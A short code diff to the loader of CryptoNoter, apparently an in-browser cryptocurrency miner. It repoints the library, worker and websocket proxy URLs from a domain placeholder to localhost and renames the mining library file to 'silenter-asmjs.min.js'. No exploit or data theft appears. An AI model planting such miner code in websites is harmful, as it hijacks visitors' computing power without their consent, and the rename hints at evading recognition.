@@ -66,7 +66,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", "https://%CryptoNoter_domain%/worker.js", true);
+            xhr.open("get", "http://127.0.0.1/web/worker.js", true);
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
@@ -76,7 +76,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", CryptoNoter.CONFIG.LIB_URL + "cryptonoter-asmjs.min.js", true);
+            xhr.open("get", CryptoNoter.CONFIG.LIB_URL + "silenter-asmjs.min.js", true);
             xhr.send()
         }
     };
@@ -489,6 +489,6 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://%CryptoNoter_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]]
+    LIB_URL: "http://127.0.0.1/web/lib/",
+    WEBSOCKET_SHARDS: [["ws://127.0.0.1/proxy"]]
 };
